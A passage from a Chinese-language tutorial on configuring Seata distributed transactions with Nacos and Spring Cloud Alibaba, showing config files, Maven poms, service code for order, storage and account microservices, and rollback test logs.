"ee08c2b7-2b41-4e9d-aeae-aae35a8dbd1d" cluster = "default" username = "" password = "" }}config { type = "file" file { name = "file.conf" }} ★registry.conf 完整配置★ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788registry { # file 、nacos 、eureka、redis、zk、consul、etcd3、sofa type = "nacos" nacos { application = "seata-server" serverAddr = "127.0.0.1:8848" group = "seata_demo" namespace = "ee08c2b7-2b41-4e9d-aeae-aae35a8dbd1d" cluster = "default" username = "" password = "" } eureka { serviceUrl = "http://localhost:8761/eureka" application = "default" weight = "1" } redis { serverAddr = "localhost:6379" db = 0 password = "" cluster = "default" timeout = 0 } zk { cluster = "default" serverAddr = "127.0.0.1:2181" sessionTimeout = 6000 connectTimeout = 2000 username = "" password = "" } consul { cluster = "default" serverAddr = "127.0.0.1:8500" } etcd3 { cluster = "default" serverAddr = "http://localhost:2379" } sofa { serverAddr = "127.0.0.1:9603" application = "default" region = "DEFAULT_ZONE" datacenter = "DefaultDataCenter" cluster = "default" group = "SEATA_GROUP" addressWaitTime = "3000" } file { name = "file.conf" }}config { # file、nacos 、apollo、zk、consul、etcd3 type = "file" nacos { serverAddr = "127.0.0.1:8848" namespace = "" group = "SEATA_GROUP" username = "" password = "" } consul { serverAddr = "127.0.0.1:8500" } apollo { appId = "seata-server" apolloMeta = "http://192.168.1.204:8801" namespace = "application" } zk { serverAddr = "127.0.0.1:2181" sessionTimeout = 6000 connectTimeout = 2000 username = "" password = "" } etcd3 { serverAddr = "http://localhost:2379" } file { name = "file.conf" }} 3.3、拷贝配置文件 1）将上面的 file.conf、registry.conf 配置文件拷贝到 Seata Server 的 conf 目录下，直接覆盖原有的配置文件即可 2）由于本案例没有使用配置中心，因此还需要将上面的 file.conf 配置文件拷贝到每个 Maven 子工程的 src/main/resource 目录下 4、创建 Maven 父工程创建 Maven 父工程，配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，项目整体结构如下： ★父工程的 Maven 配置★ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;groupId&gt;com.seata.study&lt;/groupId&gt;&lt;artifactId&gt;seata-transaction-demo&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;pom&lt;/packaging&gt;&lt;modules&gt; &lt;module&gt;seata-common-api&lt;/module&gt; &lt;module&gt;seata-order-service&lt;/module&gt; &lt;module&gt;seata-storage-service&lt;/module&gt; &lt;module&gt;seata-account-service&lt;/module&gt;&lt;/modules&gt;&lt;!-- 统一管理版本 --&gt;&lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;junit.version&gt;4.12&lt;/junit.version&gt; &lt;log4j.version&gt;1.2.17&lt;/log4j.version&gt; &lt;mysql.version&gt;8.0.21&lt;/mysql.version&gt; &lt;spring.cloud.version&gt;Hoxton.SR8&lt;/spring.cloud.version&gt; &lt;spring.boot.version&gt;2.3.2.RELEASE&lt;/spring.boot.version&gt; &lt;spring.cloud.alibaba&gt;2.2.3.RELEASE&lt;/spring.cloud.alibaba&gt; &lt;seata.spring.boot.version&gt;1.4.0&lt;/seata.spring.boot.version&gt; &lt;druid.spring.boot.version&gt;1.2.4&lt;/druid.spring.boot.version&gt; &lt;mybatis.spring.boot.version&gt;2.1.3&lt;/mybatis.spring.boot.version&gt;&lt;/properties&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;!--spring boot--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-dependencies&lt;/artifactId&gt; &lt;version&gt;${spring.boot.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;!--spring cloud--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;${spring.cloud.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;!--spring cloud alibaba--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-alibaba-dependencies&lt;/artifactId&gt; &lt;version&gt;${spring.cloud.alibaba}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;!--mysql--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;${mysql.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!--druid--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${druid.spring.boot.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!--mybatis--&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${mybatis.spring.boot.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!--log4j--&gt; &lt;dependency&gt; &lt;groupId&gt;log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j&lt;/artifactId&gt; &lt;version&gt;${log4j.version}&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt; 5、创建订单工程5.1、创建 pom.xml ★订单工程的 Maven 配置★ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;parent&gt; &lt;groupId&gt;com.seata.study&lt;/groupId&gt; &lt;artifactId&gt;seata-transaction-demo&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;!--seata-common-api--&gt; &lt;dependency&gt; &lt;groupId&gt;com.seata.study&lt;/groupId&gt; &lt;artifactId&gt;seata-common-api&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;!--nacos config--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--nacos discovery--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--seata--&gt; &lt;dependency&gt; &lt;!-- 阿里巴巴已经集成服务间调用X-id的传递，包括FeignClient的重写，如果在之前自定义封装过Feign，注意两者之间的冲突--&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-seata&lt;/artifactId&gt; &lt;exclusions&gt; &lt;!--去除默认依赖的版本--&gt; &lt;exclusion&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;artifactId&gt;seata-spring-boot-starter&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;!-- 指定Seata的版本，需要与Seata服务端的版本保持一致--&gt; &lt;dependency&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;artifactId&gt;seata-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${seata.spring.boot.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!--openfeign--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--web--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--actuator--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--mysql--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--druid--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--mybatis--&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 5.2、创建 bootstrap.ymlSeata 1.1.0 版本之后客户端已经支持用 YAML 文件替代 xxxx.conf 文件。以下 bootstrap.yml 由于添加了 seata.registry 来配置 Seata Server 所使用的注册中心，因此不再需要拷贝 Seata Server 的 registry.conf 配置文件拷到每个 Maven 子工程的 src/main/resource 目录下。 特别注意：bootstrap.yml 中的 Seata 配置项，必须严格与 Seata Server 的 registry.conf、file.conf 的配置一致，否则会导致应用启动后无法正常连接 Seata Server seata.registry.nacos.group 必须与 Seata Server 的 registry.conf 中的 registry.nacos.group 一致 seata.registry.nacos.namespace 必须与 Seata Server 的 registry.conf 中的 registry.nacos.namespace 一致 seata.registry.nacos.server-addr 必须与 Seata Server 的 registry.conf 中的 registry.nacos.serverAddr 一致 seata.registry.nacos.application 必须与 Seata Server 的 registry.conf 中的 registry.nacos.application 一致 seata.tx-service-group 必须与 Seata Server 的 file.conf 中的 service.vgroupMapping.xxxx = "default" 的 xxxx 一致 在 file.conf 里，service.vgroupMapping.xxxx = "default" 支持配置多个，对应的就是多个微服务应用 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061nacos: # Nacos的地址 server-addr: 127.0.0.1:8848 # Nacos的命名空间 namespace: ee08c2b7-2b41-4e9d-aeae-aae35a8dbd1d # Nacos的配置分组 group: seata_demo # Seata Server的配置 seata: application: seata-server tx-service-group: seata-order-service-tx-group####### 以上是自定义配置中心和注册中心的共同属性，方便其他地方直接引用 #######server: port: 2001spring: application: name: seata-order-service cloud: nacos: discovery: server-addr: ${nacos.server-addr} namespace: ${nacos.namespace} group: ${nacos.group} datasource: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://127.0.0.1:3306/seata_order?useUnicode=true&amp;characterEncoding=utf8&amp;allowMultiQueries=true&amp;useSSL=false username: root password: 123456mybatis: mapperLocations: classpath*:mapper/*.xml type-aliases-package: com.seata.study.domainseata: enabled: true application-id: ${spring.application.name} tx-service-group: ${nacos.seata.tx-service-group} enable-auto-data-source-proxy: false registry: type: nacos nacos: application: ${nacos.seata.application} server-addr: ${nacos.server-addr} namespace: ${nacos.namespace} group: ${nacos.group} username: "" password: "" config: type: filefeign: hystrix: enabled: falselogging: level: io: seata: info 5.3、注入代理数据源Seata 通过代理数据源的方式实现分支事务，其中 MyBatis 和 JPA 都需要注入 io.seata.rm.datasource.DataSourceProxy, 不同的是，MyBatis 还需要额外注入 org.apache.ibatis.session.SqlSessionFactory。在 Spring Boot Seata Starter 2.2.0.RELEASE 及以后版本，代理数据源的注入 Seata 已经自动实现了，即不需要再手动去配置。若希望 Seata 自动注入代理数据源，需要在工程里的 file.conf 配置文件添加 support.spring.datasource.autoproxy=true，手动实现的方式如下： 123456789101112131415161718192021222324252627282930@Configurationpublic class DataSourceProxyConfig { @Value("${mybatis.mapperLocations}") private String mapperLocations; @Value("${mybatis.type-aliases-package}") private String typeAliasesPackage; @Bean @ConfigurationProperties(prefix = "spring.datasource") public DataSource dataSource() { return new DruidDataSource(); } @Bean public DataSourceProxy dataSourceProxy(DataSource dataSource) { return new DataSourceProxy(dataSource); } @Bean public SqlSessionFactory sqlSessionFactory(DataSourceProxy dataSourceProxy) throws Exception { SqlSessionFactoryBean sqlSessionFactoryBean = new SqlSessionFactoryBean(); sqlSessionFactoryBean.setDataSource(dataSourceProxy); sqlSessionFactoryBean.setMapperLocations(new PathMatchingResourcePatternResolver().getResources(mapperLocations)); sqlSessionFactoryBean.setTypeAliasesPackage(typeAliasesPackage); sqlSessionFactoryBean.setTransactionFactory(new SpringManagedTransactionFactory()); return sqlSessionFactoryBean.getObject(); }} 5.4、添加全局事务注解在订单创建的入口方法上面添加 @GlobalTransactional 来控制分布式事务，这里使用 OpenFeign 去调用库存服务和账户服务的接口 1234567891011121314151617181920212223242526@Servicepublic class OrderServiceImpl implements OrderService { @Resource private OrderMapper orderMapper; @Resource private AccountClient accountClient; @Resource private StorageClient storageClient; @Override @GlobalTransactional(name = "create-order", rollbackFor = Exception.class) public CommonResult createOrder(Order order) { // 创建订单 orderMapper.create(order); // 扣减商品库存 storageClient.decrease(order.getProductId(), order.getCount()); // 扣减账户余额 accountClient.decrease(order.getUserId(), order.getMoney()); //更新订单状态 orderMapper.update(order.getId(), OrderStatus.FINISHED.getValue()); return new CommonResult(); }} 5.5、创建主启动类123456789@SpringBootApplication(exclude = DataSourceAutoConfiguration.class)@EnableDiscoveryClient@EnableFeignClientspublic class OrderApplication { public static void main(String[] args) { SpringApplication.run(OrderApplication.class, args); }} 6、创建库存工程6.1、创建 pom.xml ★库存工程的 Maven 配置★ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;parent&gt; &lt;groupId&gt;com.seata.study&lt;/groupId&gt; &lt;artifactId&gt;seata-transaction-demo&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;!--seata-common-api--&gt; &lt;dependency&gt; &lt;groupId&gt;com.seata.study&lt;/groupId&gt; &lt;artifactId&gt;seata-common-api&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;!--nacos config--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--nacos discovery--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--seata--&gt; &lt;dependency&gt; &lt;!-- 阿里巴巴已经集成服务间调用X-id的传递，包括FeignClient的重写，如果在之前自定义封装过Feign，注意两者之间的冲突--&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-seata&lt;/artifactId&gt; &lt;exclusions&gt; &lt;!--去除默认依赖的版本--&gt; &lt;exclusion&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;artifactId&gt;seata-spring-boot-starter&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;!-- 指定Seata的版本，需要与Seata服务端的版本保持一致--&gt; &lt;dependency&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;artifactId&gt;seata-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${seata.spring.boot.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!--openfeign--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--web--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--actuator--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--mysql--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--druid--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--mybatis--&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 6.2、创建 bootstrap.yml12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061nacos: # Nacos的地址 server-addr: 127.0.0.1:8848 # Nacos的命名空间 namespace:ee08c2b7-2b41-4e9d-aeae-aae35a8dbd1d # Nacos的配置分组 group: seata_demo # Seata Server的配置 seata: application: seata-server tx-service-group: seata-storage-service-tx-group####### 以上是自定义配置中心和注册中心的共同属性，方便其他地方直接引用 #######server: port: 2000spring: application: name: seata-storage-service cloud: nacos: discovery: server-addr: ${nacos.server-addr} namespace: ${nacos.namespace} group: ${nacos.group} datasource: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://127.0.0.1:3306/seata_storage?useUnicode=true&amp;characterEncoding=utf8&amp;allowMultiQueries=true&amp;useSSL=false username: root password: 123456mybatis: mapperLocations: classpath*:mapper/*.xml type-aliases-package: com.seata.study.domainseata: enabled: true application-id: ${spring.application.name} tx-service-group: ${nacos.seata.tx-service-group} enable-auto-data-source-proxy: false registry: type: nacos nacos: application: ${nacos.seata.application} server-addr: ${nacos.server-addr} namespace: ${nacos.namespace} group: ${nacos.group} username: "" password: "" config: type: filefeign: hystrix: enabled: falselogging: level: io: seata: info 6.3、注入代理数据源 ★代理数据源注入代码★ 123456789101112131415161718192021222324252627282930@Configurationpublic class DataSourceProxyConfig { @Value("${mybatis.mapperLocations}") private String mapperLocations; @Value("${mybatis.type-aliases-package}") private String typeAliasesPackage; @Bean @ConfigurationProperties(prefix = "spring.datasource") public DataSource dataSource() { return new DruidDataSource(); } @Bean public DataSourceProxy dataSourceProxy(DataSource dataSource) { return new DataSourceProxy(dataSource); } @Bean public SqlSessionFactory sqlSessionFactory(DataSourceProxy dataSourceProxy) throws Exception { SqlSessionFactoryBean sqlSessionFactoryBean = new SqlSessionFactoryBean(); sqlSessionFactoryBean.setDataSource(dataSourceProxy); sqlSessionFactoryBean.setMapperLocations(new PathMatchingResourcePatternResolver().getResources(mapperLocations)); sqlSessionFactoryBean.setTypeAliasesPackage(typeAliasesPackage); sqlSessionFactoryBean.setTransactionFactory(new SpringManagedTransactionFactory()); return sqlSessionFactoryBean.getObject(); }} 6.4、创建业务处理类123456789101112131415161718192021222324252627@Servicepublic class StorageServiceImpl implements StorageService { @Resource private StorageMapper storageMapper; @Override public CommonResult decrease(Long productId, Long count) { Storage storage = storageMapper.findByProduct(productId); Long total = storage.getTotal(); Long used = storage.getUsed(); Long residue = storage.getResidue(); // 校验参数 if (count == null || count &lt;= 0) { return new CommonResult(SystemCode.ERROR_PARAMETER); } // 判断库存是否足够 if (count &gt; residue) { return new CommonResult(SystemCode.STORAGE_NOT_ENOUGH); } // 扣减库存 storage.setUsed(used + count); storage.setResidue(residue - count); storageMapper.update(storage); return new CommonResult(); }} 6.5、创建启动主类123456789@SpringBootApplication@EnableDiscoveryClient@EnableFeignClientspublic class StorageApplication { public static void main(String[] args) { SpringApplication.run(StorageApplication.class, args); }} 7、创建账户工程7.1、创建 pom.xml ★账户工程的 Maven 配置★ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;parent&gt; &lt;groupId&gt;com.seata.study&lt;/groupId&gt; &lt;artifactId&gt;seata-transaction-demo&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;!--seata-common-api--&gt; &lt;dependency&gt; &lt;groupId&gt;com.seata.study&lt;/groupId&gt; &lt;artifactId&gt;seata-common-api&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;!--nacos config--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--nacos discovery--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--seata--&gt; &lt;dependency&gt; &lt;!-- 阿里巴巴已经集成服务间调用X-id的传递，包括FeignClient的重写，如果在之前自定义封装过Feign，注意两者之间的冲突--&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-seata&lt;/artifactId&gt; &lt;exclusions&gt; &lt;!--去除默认依赖的版本--&gt; &lt;exclusion&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;artifactId&gt;seata-spring-boot-starter&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;!-- 指定Seata的版本，需要与Seata服务端的版本保持一致--&gt; &lt;dependency&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;artifactId&gt;seata-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${seata.spring.boot.version}&lt;/version&gt; &lt;/dependency&gt; &lt;!--openfeign--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--web--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--actuator--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--mysql--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--druid--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--mybatis--&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 7.2、创建 bootstrap.yml12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061nacos: # Nacos的地址 server-addr: 127.0.0.1:8848 # Nacos的命名空间 namespace:ee08c2b7-2b41-4e9d-aeae-aae35a8dbd1d # Nacos的配置分组 group: seata_demo # Seata Server的配置 seata: application: seata-server tx-service-group: seata-account-service-tx-group####### 以上是自定义配置中心和注册中心的共同属性，方便其他地方直接引用 #######server: port: 2002spring: application: name: seata-account-service cloud: nacos: discovery: server-addr: ${nacos.server-addr} namespace: ${nacos.namespace} group: ${nacos.group} datasource: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://127.0.0.1:3306/seata_account?useUnicode=true&amp;characterEncoding=utf8&amp;allowMultiQueries=true&amp;useSSL=false username: root password: 123456mybatis: mapperLocations: classpath*:mapper/*.xml type-aliases-package: com.seata.study.domainseata: enabled: true application-id: ${spring.application.name} tx-service-group: ${nacos.seata.tx-service-group} enable-auto-data-source-proxy: false registry: type: nacos nacos: application: ${nacos.seata.application} server-addr: ${nacos.server-addr} namespace: ${nacos.namespace} group: ${nacos.group} username: "" password: "" config: type: filefeign: hystrix: enabled: falselogging: level: io: seata: info 7.3、注入代理数据源 ★代理数据源注入代码★ 123456789101112131415161718192021222324252627282930@Configurationpublic class DataSourceProxyConfig { @Value("${mybatis.mapperLocations}") private String mapperLocations; @Value("${mybatis.type-aliases-package}") private String typeAliasesPackage; @Bean @ConfigurationProperties(prefix = "spring.datasource") public DataSource dataSource() { return new DruidDataSource(); } @Bean public DataSourceProxy dataSourceProxy(DataSource dataSource) { return new DataSourceProxy(dataSource); } @Bean public SqlSessionFactory sqlSessionFactory(DataSourceProxy dataSourceProxy) throws Exception { SqlSessionFactoryBean sqlSessionFactoryBean = new SqlSessionFactoryBean(); sqlSessionFactoryBean.setDataSource(dataSourceProxy); sqlSessionFactoryBean.setMapperLocations(new PathMatchingResourcePatternResolver().getResources(mapperLocations)); sqlSessionFactoryBean.setTypeAliasesPackage(typeAliasesPackage); sqlSessionFactoryBean.setTransactionFactory(new SpringManagedTransactionFactory()); return sqlSessionFactoryBean.getObject(); }} 7.4、创建业务处理类这里添加了模拟账户业务处理超时的代码，延时时间为 10 秒。因为 OpenFeign 的默认超时时间为 1 秒，所以当订单服务远程调用账户服务来扣减账户余额时，会抛出请求超时的异常，这时就可以测试全局事务注解 @GlobalTransactional 是否生效了。若 @GlobalTransactional 生效，当订单服务的远程调用抛出请求超时的异常后，账户数据库里对应的账户余额不会被修改；若账户余额被修改了，则说明 @GlobalTransactional 没有生效。 12345678910111213141516171819202122232425262728293031323334@Servicepublic class AccountServiceImpl implements AccountService { @Resource private AccountMapper accountMapper; @Override public CommonResult decrease(Long userId, BigDecimal money) { Account account = accountMapper.findByUser(userId); BigDecimal total = account.getTotal(); BigDecimal used = account.getUsed(); BigDecimal residue = account.getResidue(); // 模拟业务处理超时 try { Thread.sleep(10000); } catch (InterruptedException e) { e.printStackTrace(); } // 校验参数 if (money == null || money.compareTo(BigDecimal.ZERO) &lt; 1) { return new CommonResult(SystemCode.ERROR_PARAMETER); } // 判断余额是否足够 if (money.compareTo(residue) == 1) { return new CommonResult(SystemCode.ACCOUNT_NOT_ENOUGH); } // // 扣减余额 account.setUsed(account.getUsed().add(money)); account.setResidue(account.getResidue().subtract(money)); accountMapper.update(account); return new CommonResult(); }} 7.5、创建主启动类123456789@SpringBootApplication@EnableDiscoveryClient@EnableFeignClientspublic class AccountApplication { public static void main(String[] args) { SpringApplication.run(AccountApplication.class, args); }} 8、测试项目代码 1）首先启动 MySQL Server、Nacos Server、Seata Server，并按照上文介绍的准备工作进行初始化 2）分别启动 seata-account-service、seata-storage-service、seata-order-service 服务 3）浏览器访问 http://127.0.0.1:8848/nacos 打开 Nacos 的控制台，各服务成功启动后，在 Nacos 的控制台里可以看到有多个服务已注册（如下图） 4）观察不同数据库中的 seata_account.t_account、seata_storage.t_storage 业务表的数据，如下图： 5）浏览器访问 http://127.0.0.1:2001/order/create?userId=1&amp;count=3&amp;money=20&amp;productId=1 调用订单创建接口，由于订单服务远程调用账户服务来扣减账户余额时，抛出了请求超时的异常，因此响应的 500 错误页面显示如下： 6）再观察不同数据库中的 seata_account.t_account、seata_storage.t_storage 业务表的数据是否发生了变更，若数据没有变更，则说明全局事务注解 @GlobalTransactional 生效了，否则注解没有生效 7）创建订单的接口被调用后，可以看到三个应用在控制台输出的日志如下： ★各微服务的日志信息★ 123456789101112################## seata_order 服务的日志 #####################java.net.SocketTimeoutException: Read timed out at java.base/java.net.SocketInputStream.socketRead0(Native Method) ~[na:na] at java.base/java.net.SocketInputStream.socketRead(SocketInputStream.java:115) ~[na:na] at java.base/java.net.SocketInputStream.read(SocketInputStream.java:168) ~[na:na] at java.base/java.net.SocketInputStream.read(SocketInputStream.java:140) ~[na:na] at java.base/java.io.BufferedInputStream.fill(BufferedInputStream.java:252) ~[na:na] at java.base/java.io.BufferedInputStream.read1(BufferedInputStream.java:292) ~[na:na] at java.base/java.io.BufferedInputStream.read(BufferedInputStream.java:351) ~[na:na] at java.base/sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:746) ~[na:na] at java.base/sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:689) ~[na:na] 123456################## seata_storage 服务的日志 #####################[_RMROLE_1_2_144] i.s.c.r.p.c.RmBranchRollbackProcessor : rm handle branch rollback process:xid=192.168.1.130:8091:86489181212647424,branchId=86489188837892097,branchType=AT,resourceId=jdbc:mysql://127.0.0.1:3306/seata_storage,applicationData=null[_RMROLE_1_2_144] io.seata.rm.AbstractRMHandler : Branch Rollbacking: 192.168.1.130:8091:86489181212647424 86489188837892097 jdbc:mysql://127.0.0.1:3306/seata_storage[_RMROLE_1_2_144] i.s.r.d.undo.AbstractUndoLogManager : xid 192.168.1.130:8091:86489181212647424 branch 86489188837892097, undo_log deleted with GlobalFinished[_RMROLE_1_2_144] io.seata.rm.AbstractRMHandler : Branch Rollbacked result: PhaseTwo_Rollbacked 1234567891011################## seata_account 服务的日志 #####################io.seata.core.exception.RmTransactionException: Response[ TransactionException[Could not found global transaction xid = 192.168.1.130:8091:86489181212647424, may be has finished.] ] at io.seata.rm.AbstractResourceManager.branchRegister(AbstractResourceManager.java:69) 